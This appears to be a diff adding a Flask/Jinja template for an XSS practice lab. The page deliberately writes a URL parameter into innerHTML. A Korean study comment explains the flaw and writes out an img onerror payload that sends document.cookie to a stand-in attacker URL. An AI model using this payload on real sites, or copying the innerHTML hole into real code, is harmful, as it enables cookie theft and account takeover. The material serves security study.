@@ -1,0 +1,29 @@
+{% extends "base.html" %}
+{% block title %}Index{% endblock %}
+
+{% block head %}
+  {{ super() }}
+  <style type="text/css">
+    .important { color: #336699; }
+  </style>
+{% endblock %}
+<!-- xss 공격 중 하나로 잘못된 태그를 생성해서 요청을 보낼 수 있다.
+    현재 flag에 요청을 보내면 vuln에서 바로 return으로 실행하는 건 아니지만
+    innerHTML을 통해 특정 태그 안에 삽입한다.
+    <script> 태그는 실행되지 않지만 img태그에서 발생하는 onerror로 JS를 실행시킬 수 있다.
+
+    이걸 통해 XSS에 취약한 사이트에 악의적인 onerror 이벤트가 있는 img를 게시물에 심어서
+    임의의 사용자가 해당 게시물에 접근했을 때 피싱 사이트("http://myhacklink?memo=")로 쿠키를 전달하는 로직을 만든다.
+    img src='XXXX' onerror="location.href='http://myhacklink?memo=' + document.cookie"
+
+    127.0.0.1은 localhost라는 걸 기억하자!
+    이해가 안 간다면 하나하나 추적해보기!
+ -->
+{% block content %}
+    <div id='vuln'>
+        </div>
+        <script>
+            var x= new URLSearchParams(location.search);
+            document.getElementById('vuln').innerHTML = x.get('param');
+        </script>
+{% endblock %}
